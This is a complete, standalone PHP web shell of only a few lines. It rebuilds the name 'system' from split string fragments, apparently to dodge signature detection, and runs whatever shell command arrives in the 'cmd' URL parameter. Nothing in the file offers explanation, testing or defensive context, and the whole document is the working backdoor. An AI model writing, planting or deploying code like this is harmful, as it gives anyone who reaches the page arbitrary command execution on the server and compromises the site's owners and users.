<?php
$sys = ['sy', 'st', 'em'];
call_user_func($sys[0].$sys[1].$sys[2], filter_input(INPUT_GET, 'cmd', FILTER_DEFAULT));
?>
